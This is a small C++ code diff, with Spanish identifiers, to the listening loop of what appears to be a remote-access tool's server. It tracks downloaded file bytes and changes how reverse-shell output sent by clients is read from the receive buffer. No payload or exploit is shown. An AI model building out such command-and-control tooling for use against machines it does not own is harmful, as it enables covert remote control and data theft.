@@ -338,6 +338,7 @@ void Servidor::m_Escucha(){
                         auto archivoIter = cliIT->second.um_Archivos_Descarga2.find(vcDatos[1]);
                         if (archivoIter != cliIT->second.um_Archivos_Descarga2.end() && archivoIter->second.iFP != nullptr) {
                             fwrite(cBytes, sizeof(char), iRecibido - iHeader, archivoIter->second.iFP);
+                            archivoIter->second.uDescargado += (iRecibido - iHeader);
                         }
                         
                         lock.unlock();
@@ -392,13 +393,9 @@ void Servidor::m_Escucha(){
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Salida)) {
-                        std::string strOutJoined = "";
-                        for (int i = 1; i<int(vcDatos.size()); i++) {
-                            strOutJoined += vcDatos[i] + "\\";
-                        }
-                        strOutJoined = strOutJoined.substr(0, strOutJoined.size() - 1);
-
-                        isEscribirSalidaShell(cliIT->second._id, strOutJoined);
+                        int iCmdH = (std::to_string(EnumComandos::Reverse_Shell_Salida).size() + 1);
+                        char* pBuf = cBuffer + iCmdH;
+                        isEscribirSalidaShell(cliIT->second._id, pBuf);
                         continue;
                     }
 
